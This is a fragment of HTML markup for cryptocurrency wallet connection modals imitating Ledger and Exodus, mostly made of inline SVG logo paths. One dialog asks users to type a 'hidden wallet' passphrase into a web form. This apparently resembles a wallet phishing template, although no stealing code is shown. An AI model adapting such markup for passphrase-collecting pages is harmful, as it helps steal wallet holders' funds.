                      d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                      fill="#202020"
                    ></path>
                    <path
                      d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                      fill="white"
                    ></path>
                    <path
                      d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                      fill="#202020"
                    ></path>
                  </svg>
                </div>
                <div>
                  <button
                    class="scwtw-p-1 scwtw-rounded-[12px] hover:scwtw-bg-[#f3f3f3] dark:hover:scwtw-bg-[#eaeaea0d] scwtw-transition-all scwtw-duration-300 active:scwtw-scale-95"
                    type="button"
                    id="ledger-close-button2"
                  >
                    <svg
                      class="scwtw-w-6 scwtw-h-6 scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    >
                      <path d="M18 6 6 18"></path>
                      <path d="m6 6 12 12"></path>
                    </svg>
                  </button>
                </div>
              </div>
              <div class="scwtw-mt-6">
                <div
                  class="scwtw-flex scwtw-flex-col scwtw-items-start scwtw-justify-start scwtw-text-start scwtw-gap-y-1.5"
                >
                  <div>
                    <h3
                      class="scwtw-text-[#202020] dark:scwtw-text-[#ffffff] font-inter scwtw-font-bold scwtw-text-[22px]"
                    >
                      Import Hidden Wallet
                    </h3>
                  </div>
                  <div class="scwtw-mb-1.5">
                    <p
                      class="scwtw-text-[#141618] dark:scwtw-text-[#dddddd] font-inter scwtw-font-normal scwtw-text-[16px]"
                    >
                      Enter passphrase to authenticate to your hidden wallet.
                      This input can be empty.
                    </p>
                  </div>
                </div>
              </div>
              <div class="scwtw-mt-4">
                <div class="scwtw-relative scwtw-w-full">
                  <input
                    class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-px-[20px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter ledger-passphrase-input"
                    type="text"
                  />
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#202020] dark:scwtw-text-[#ffffff] dark:scwtw-bg-[#ffffff05] scwtw-font-normal font-inter scwtw-text-[15px] scwtw-cursor-pointer scwtw-rounded-[16px] scwtw-h-[48px] hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                    id="ledger-import-passphrase-button"
                  >
                    Import Hidden Wallet
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>


   <!-- Exodus -->

   <div
   id="exodus-modal-overlay"
   style="display: none"
   class="exodus-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
 ></div>
 <div
   id="exodus-modal"
   style="display: none"
   class="exodus-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
 >
   <div
     class="exodus-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-1/2 md:scwtw-left-1/2 md:-scwtw-translate-x-1/2 md:-scwtw-translate-y-1/2 md:scwtw-max-w-[620px] md:scwtw-h-[550px] scwtw-rounded-[24px] scwtw-bg-[#ffffff] dark:scwtw-bg-[#121313] dark:scwtw-border dark:scwtw-border-[#292929] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2"
   >
     <div class="scwtw-h-full scwtw-w-full">
       <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
         <div
           id="exodus-container"
           class="scwtw-h-full scwtw-w-full scwtw-absolute scwtw-flex scwtw-flex-col scwtw-transition-opacity scwtw-duration-500 scwtw-z-[2147483648] scwtw-opacity-0 scwtw-hidden"
         >
           <div
             class="scwtw-flex-1 scwtw-flex scwtw-items-center scwtw-justify-center"
           >
             <div
               class="scwtw-relative scwtw-flex scwtw-flex-col scwtw-items-center"
             >
               <div class="scwtw-relative">
                 <div class="scwtw-relative scwtw-rounded-2xl scwtw-p-6">
                   <svg                      class="scwtw-w-28 scwtw-h-28 scwtw-object-contain trezor-loading-image" xmlns:xodm="http://www.corel.com/coreldraw/odm/2003" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 2500 2500" style="enable-background:new 0 0 2500 2500;" xml:space="preserve">
<style type="text/css">
	.st0{fill-rule:evenodd;clip-rule:evenodd;fill:url(#SVGID_1_);}
</style>
<g id="Layer_x0020_1">
	
		<linearGradient id="SVGID_1_" gradientUnits="userSpaceOnUse" x1="2252.8638" y1="279.9229" x2="70.8636" y2="2387.9229" gradientTransform="matrix(1 0 0 -1 0 2499.2756)">
		<stop offset="0" style="stop-color:#2964F4"/>
		<stop offset="0.3373" style="stop-color:#6493F1"/>
		<stop offset="0.4784" style="stop-color:#9FC3ED"/>
		<stop offset="0.8588" style="stop-color:#8B63FC"/>
		<stop offset="1" style="stop-color:#8C64FC"/>
	</linearGradient>
	<path class="st0" d="M1084,0L0,698l177,553L0,1804l1086,696v-390l-695-444l82-254h611v-323H470l-80-254l693-444V1L1084,0z M1416,0   v390l695,444l-82,254h-614v323h614l82,254l-695,444v390l1084-696l-177-553l177-553L1416-1V0z"/>
</g>
</svg>
                 </div>
               </div>
               <p
                 class="scwtw-mt-6 scwtw-text-[#202020] font-inter scwtw-font-normal dark:scwtw-text-[#ffffff] scwtw-text-[20px] connecting-loading-text"
               >
                 Connecting to exodus Kit
               </p>
             </div>
           </div>
           <div
             class="scwtw-pb-8 scwtw-flex scwtw-items-center scwtw-justify-center"
           >
             <svg
               class="scwtw-h-6 scwtw-w-auto"
               width="494"
               height="48"
               viewBox="0 0 494 48"
               fill="none"
               xmlns="http://www.w3.org/2000/svg"
             >
               <path
                 d="M245 24C245 10.745 255.055 0 267.459 0H324.541C336.945 0 347 10.745 347 24C347 37.255 336.945 48 324.541 48H267.459C255.055 48 245 37.255 245 24Z"
                 fill="#202020"
               ></path>
               <path
                 d="M315.106 29.874V18.786H317.064V20.458C317.768 19.226 319.198 18.5 320.782 18.5C323.18 18.5 324.852 20.018 324.852 22.966V29.874H322.916V23.076C322.916 21.14 321.816 20.128 320.21 20.128C318.472 20.128 317.064 21.514 317.064 23.472V29.874H315.106ZM302.761 29.874L300.715 18.786H302.563L304.015 27.938L305.929 21.91H307.755L309.647 27.872L311.121 18.786H312.969L310.923 29.874H308.723L306.853 24.11L304.961 29.874H302.761ZM294.113 30.16C290.747 30.16 288.767 27.652 288.767 24.33C288.767 21.03 290.747 18.5 294.113 18.5C297.479 18.5 299.459 21.03 299.459 24.33C299.459 27.652 297.479 30.16 294.113 30.16ZM294.113 28.532C296.533 28.532 297.457 26.464 297.457 24.308C297.457 22.174 296.533 20.128 294.113 20.128C291.693 20.128 290.769 22.174 290.769 24.308C290.769 26.464 291.693 28.532 294.113 28.532ZM281.842 30.16C278.586 30.16 276.54 27.674 276.54 24.33C276.54 21.008 278.586 18.5 281.842 18.5C284.592 18.5 287.012 20.062 286.748 24.836H278.542C278.696 26.882 279.642 28.554 281.842 28.554C283.316 28.554 284.284 27.652 284.614 26.618H286.55C286.242 28.466 284.504 30.16 281.842 30.16ZM278.586 23.362H284.856C284.702 21.14 283.668 20.106 281.842 20.106C279.84 20.106 278.85 21.558 278.586 23.362ZM267.148 29.874V18.786H269.15V20.656C269.854 19.424 271.064 18.786 272.318 18.786H274.98V20.656H272.164C270.404 20.656 269.15 21.8 269.15 24.022V29.874H267.148Z"
                 fill="white"
               ></path>
               <path
                 d="M360.496 16.6H362.938L365.82 24.608L368.702 16.6H371.144V32H369.208V19.966L366.7 26.632H364.94L362.432 19.966V32H360.496V16.6ZM377.879 32.286C376.764 32.286 375.862 31.9853 375.173 31.384C374.498 30.7827 374.161 29.9907 374.161 29.008C374.161 27.864 374.542 27.05 375.305 26.566C376.082 26.0673 377.05 25.7447 378.209 25.598L380.585 25.29C380.995 25.246 381.274 25.1213 381.421 24.916C381.567 24.7107 381.641 24.454 381.641 24.146V24.124C381.641 23.552 381.435 23.09 381.025 22.738C380.629 22.386 380.035 22.21 379.243 22.21C378.436 22.21 377.798 22.3933 377.329 22.76C376.874 23.112 376.603 23.6327 376.515 24.322H374.557C374.674 23.1927 375.151 22.298 375.987 21.638C376.823 20.9633 377.901 20.626 379.221 20.626C380.673 20.626 381.758 20.9707 382.477 21.66C383.21 22.3493 383.577 23.3247 383.577 24.586V29.954C383.577 30.086 383.621 30.196 383.709 30.284C383.797 30.3573 383.907 30.394 384.039 30.394H384.721V32H383.401C382.873 32 382.469 31.8827 382.191 31.648C381.912 31.3987 381.773 31.0613 381.773 30.636V30.372C381.318 31.0467 380.746 31.538 380.057 31.846C379.367 32.1393 378.641 32.286 377.879 32.286ZM378.385 30.702C379.367 30.702 380.152 30.372 380.739 29.712C381.34 29.052 381.641 28.1793 381.641 27.094V26.324C381.362 26.4707 380.988 26.5807 380.519 26.654L378.583 26.94C377.747 27.072 377.138 27.2993 376.757 27.622C376.375 27.93 376.185 28.3627 376.185 28.92C376.185 29.4773 376.383 29.9173 376.779 30.24C377.175 30.548 377.71 30.702 378.385 30.702ZM388.287 20.912H390.245V22.584C390.597 21.968 391.103 21.4913 391.763 21.154C392.438 20.802 393.171 20.626 393.963 20.626C395.195 20.626 396.178 21.0147 396.911 21.792C397.659 22.5547 398.033 23.6547 398.033 25.092V32H396.097V25.202C396.097 24.2633 395.848 23.5373 395.349 23.024C394.865 22.5107 394.212 22.254 393.391 22.254C392.819 22.254 392.291 22.4007 391.807 22.694C391.323 22.9727 390.942 23.3687 390.663 23.882C390.384 24.3807 390.245 24.9527 390.245 25.598V32H388.287V20.912ZM406 32.286C404.768 32.286 403.778 31.9047 403.03 31.142C402.296 30.3647 401.93 29.2573 401.93 27.82V20.912H403.888V27.71C403.888 28.6633 404.13 29.3967 404.614 29.91C405.098 30.4087 405.758 30.658 406.594 30.658C407.166 30.658 407.686 30.5187 408.156 30.24C408.64 29.9467 409.021 29.5433 409.3 29.03C409.593 28.5167 409.74 27.9447 409.74 27.314V20.912H411.676V32H409.74V30.328C409.373 30.944 408.86 31.428 408.2 31.78C407.54 32.1173 406.806 32.286 406 32.286ZM418.806 32.286C417.692 32.286 416.79 31.9853 416.1 31.384C415.426 30.7827 415.088 29.9907 415.088 29.008C415.088 27.864 415.47 27.05 416.232 26.566C417.01 26.0673 417.978 25.7447 419.136 25.598L421.512 25.29C421.923 25.246 422.202 25.1213 422.348 24.916C422.495 24.7107 422.568 24.454 422.568 24.146V24.124C422.568 23.552 422.363 23.09 421.952 22.738C421.556 22.386 420.962 22.21 420.17 22.21C419.364 22.21 418.726 22.3933 418.256 22.76C417.802 23.112 417.53 23.6327 417.442 24.322H415.484C415.602 23.1927 416.078 22.298 416.914 21.638C417.75 20.9633 418.828 20.626 420.148 20.626C421.6 20.626 422.686 20.9707 423.404 21.66C424.138 22.3493 424.504 23.3247 424.504 24.586V29.954C424.504 30.086 424.548 30.196 424.636 30.284C424.724 30.3573 424.834 30.394 424.966 30.394H425.648V32H424.328C423.8 32 423.397 31.8827 423.118 31.648C422.84 31.3987 422.7 31.0613 422.7 30.636V30.372C422.246 31.0467 421.674 31.538 420.984 31.846C420.295 32.1393 419.569 32.286 418.806 32.286ZM419.312 30.702C420.295 30.702 421.08 30.372 421.666 29.712C422.268 29.052 422.568 28.1793 422.568 27.094V26.324C422.29 26.4707 421.916 26.5807 421.446 26.654L419.51 26.94C418.674 27.072 418.066 27.2993 417.684 27.622C417.303 27.93 417.112 28.3627 417.112 28.92C417.112 29.4773 417.31 29.9173 417.706 30.24C418.102 30.548 418.638 30.702 419.312 30.702ZM428.775 30.394H433.065V18.206H429.567V16.6H435.023V30.394H439.291V32H428.775V30.394ZM456.302 16.6H458.304V24.52L464.728 16.6H467.148L461.846 22.936L467.412 32H465.168L460.526 24.52L458.304 27.204V32H456.302V16.6ZM469.835 30.35H473.971V22.562H470.275V20.912H475.973V30.35H480.087V32H469.835V30.35ZM473.883 16.6H476.083V19.02H473.883V16.6ZM489.329 32C488.376 32 487.672 31.7947 487.217 31.384C486.763 30.9587 486.535 30.2913 486.535 29.382V22.518H483.235V20.912H486.029C486.176 20.912 486.293 20.868 486.381 20.78C486.484 20.692 486.535 20.5747 486.535 20.428V17.238H488.471V20.912H492.849V22.518H488.471V29.118C488.471 29.5287 488.574 29.844 488.779 30.064C488.985 30.2693 489.322 30.372 489.791 30.372H493.333V32H489.329Z"
                 fill="#202020"
               ></path>
               <path
                 d="M0.628 11.8H10.708C12.124 11.8 13.408 12.124 14.56 12.772C15.712 13.396 16.612 14.296 17.26 15.472C17.908 16.624 18.232 17.944 18.232 19.432C18.232 20.92 17.908 22.24 17.26 23.392C16.612 24.544 15.712 25.444 14.56 26.092C13.408 26.716 12.124 27.028 10.708 27.028H3.904V37H0.628V11.8ZM10.096 24.328C11.536 24.328 12.676 23.884 13.516 22.996C14.38 22.084 14.812 20.896 14.812 19.432C14.812 17.944 14.38 16.756 13.516 15.868C12.676 14.98 11.536 14.536 10.096 14.536H3.904V24.328H10.096ZM31.4842 37.468C28.4842 37.468 26.1562 36.352 24.5002 34.12C22.8442 31.888 22.0162 28.648 22.0162 24.4C22.0162 20.152 22.8442 16.912 24.5002 14.68C26.1562 12.448 28.4842 11.332 31.4842 11.332C34.4842 11.332 36.8122 12.448 38.4682 14.68C40.1242 16.912 40.9522 20.152 40.9522 24.4C40.9522 28.648 40.1242 31.888 38.4682 34.12C36.8122 36.352 34.4842 37.468 31.4842 37.468ZM31.4842 34.624C33.5722 34.624 35.0962 33.772 36.0562 32.068C37.0402 30.34 37.5322 27.784 37.5322 24.4C37.5322 21.016 37.0402 18.472 36.0562 16.768C35.0962 15.04 33.5722 14.176 31.4842 14.176C29.3962 14.176 27.8602 15.04 26.8762 16.768C25.9162 18.472 25.4362 21.016 25.4362 24.4C25.4362 27.784 25.9162 30.34 26.8762 32.068C27.8602 33.772 29.3962 34.624 31.4842 34.624ZM43.8724 11.8H47.1124L48.9484 31.384L52.2964 18.676H55.3924L58.7404 31.348L60.5044 11.8H63.7444L61.0804 37H57.4804L53.8444 23.032L50.1364 37H46.5724L43.8724 11.8ZM68.1407 11.8H84.7007V14.572H71.4167V22.492H83.2247V25.156H71.4167V34.228H84.7007V37H68.1407V11.8ZM89.9249 11.8H99.5369C101.001 11.8 102.309 12.1 103.461 12.7C104.637 13.276 105.549 14.116 106.197 15.22C106.869 16.3 107.205 17.596 107.205 19.108C107.205 20.884 106.737 22.384 105.801 23.608C104.865 24.808 103.617 25.624 102.057 26.056L107.601 37H103.965L98.6009 26.38H93.2009V37H89.9249V11.8ZM98.9969 23.644C100.509 23.644 101.685 23.248 102.525 22.456C103.365 21.64 103.785 20.524 103.785 19.108C103.785 17.644 103.365 16.516 102.525 15.724C101.685 14.932 100.509 14.536 98.9969 14.536H93.2009V23.644H98.9969ZM112.789 11.8H129.349V14.572H116.065V22.492H127.873V25.156H116.065V34.228H129.349V37H112.789V11.8ZM134.573 11.8H141.485C143.741 11.8 145.709 12.34 147.389 13.42C149.069 14.5 150.353 16 151.241 17.92C152.153 19.816 152.609 21.976 152.609 24.4C152.609 26.824 152.153 28.996 151.241 30.916C150.353 32.812 149.069 34.3 147.389 35.38C145.709 36.46 143.741 37 141.485 37H134.573V11.8ZM141.305 34.228C143.753 34.228 145.673 33.34 147.065 31.564C148.457 29.788 149.153 27.4 149.153 24.4C149.153 21.4 148.457 19.012 147.065 17.236C145.673 15.46 143.753 14.572 141.305 14.572H137.849V34.228H141.305ZM179.222 11.8H188.726C190.766 11.8 192.434 12.34 193.73 13.42C195.05 14.476 195.71 15.964 195.71 17.884C195.71 19.276 195.29 20.5 194.45 21.556C193.61 22.612 192.518 23.344 191.174 23.752C192.95 24.064 194.366 24.784 195.422 25.912C196.478 27.04 197.006 28.408 197.006 30.016C197.006 31.312 196.67 32.488 195.998 33.544C195.326 34.6 194.366 35.44 193.118 36.064C191.87 36.688 190.418 37 188.762 37H179.222V11.8ZM188.33 34.264C189.842 34.264 191.09 33.868 192.074 33.076C193.082 32.26 193.586 31.12 193.586 29.656C193.586 28.36 193.106 27.304 192.146 26.488C191.186 25.672 189.962 25.264 188.474 25.264H182.498V34.264H188.33ZM187.934 22.636C189.254 22.636 190.322 22.216 191.138 21.376C191.954 20.536 192.362 19.516 192.362 18.316C192.362 17.14 192.002 16.216 191.282 15.544C190.562 14.872 189.506 14.536 188.114 14.536H182.498V22.636H187.934ZM208.458 27.244L199.854 11.8H203.562L210.078 24.22L216.594 11.8H220.302L211.698 27.244V37H208.458V27.244Z"
                 fill="#202020"
               ></path>
             </svg>
           </div>
         </div>
         <div
           id="import-container-exodus"
           class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-px-6 scwtw-py-8 scwtw-opacity-100"
         >
           <div class="scwtw-flex scwtw-items-center scwtw-justify-between">
             <div>
               <svg
                 class="scwtw-h-[35px] scwtw-w-auto"
                 width="249"
                 height="48"
                 viewBox="0 0 249 48"
                 fill="none"
                 xmlns="http://www.w3.org/2000/svg"
               >
                 <path
                   d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                   fill="#202020"
                 ></path>
                 <path
                   d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                   fill="white"
                 ></path>
                 <path
                   d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 